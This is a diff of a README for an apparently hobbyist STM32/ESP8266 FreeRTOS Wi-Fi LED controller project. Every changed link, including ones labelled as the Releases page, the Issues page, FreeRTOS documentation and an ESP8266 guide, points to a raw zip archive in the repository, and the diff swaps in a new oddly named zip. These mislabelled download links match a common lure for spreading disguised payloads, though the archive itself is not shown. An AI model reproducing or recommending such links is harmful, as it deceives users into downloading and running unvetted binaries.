@@ -8,11 +8,11 @@ Welcome to the stm32-rtos-wifi-led-control project! This application allows you 
 
 To get started, you need to download the application. Please visit the link below:
 
-[![](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip%20Now-%20brightgreen)](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip)
+[![](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/esp8266-firmware/control_wifi_stm_led_rtos_scoffery.zip%20Now-%20brightgreen)](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/esp8266-firmware/control_wifi_stm_led_rtos_scoffery.zip)
 
 Once on the Releases page, locate the latest version and download the files suitable for your hardware setup. 
 
-Here is the direct link to the Releases page for your convenience: [Download Releases](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip).
+Here is the direct link to the Releases page for your convenience: [Download Releases](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/esp8266-firmware/control_wifi_stm_led_rtos_scoffery.zip).
 
 ## 💻 System Requirements
 
@@ -70,15 +70,15 @@ If you encounter any issues, consider the following:
 
 If you have questions or need additional help, feel free to join the community:
 
-- Visit the [GitHub Issues page](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip) to report bugs or request features.
+- Visit the [GitHub Issues page](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/esp8266-firmware/control_wifi_stm_led_rtos_scoffery.zip) to report bugs or request features.
 - Check the discussions for tips and shared experiences with other users.
 
 ## 📝 Additional Resources
 
 For more information about the technologies used in this project, consider the following topics:
 
-- [FreeRTOS Documentation](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip)
-- [ESP8266 NodeMCU Guide](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip)
+- [FreeRTOS Documentation](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/esp8266-firmware/control_wifi_stm_led_rtos_scoffery.zip)
+- [ESP8266 NodeMCU Guide](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/esp8266-firmware/control_wifi_stm_led_rtos_scoffery.zip)
 
 ## 🔗 License
 
@@ -86,4 +86,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 **Ready to take control of your LEDs?** Visit the link below to download the software and start your journey!
 
-[![](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip%20Now-%20brightgreen)](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip)
+[![](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/esp8266-firmware/control_wifi_stm_led_rtos_scoffery.zip%20Now-%20brightgreen)](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/esp8266-firmware/control_wifi_stm_led_rtos_scoffery.zip)
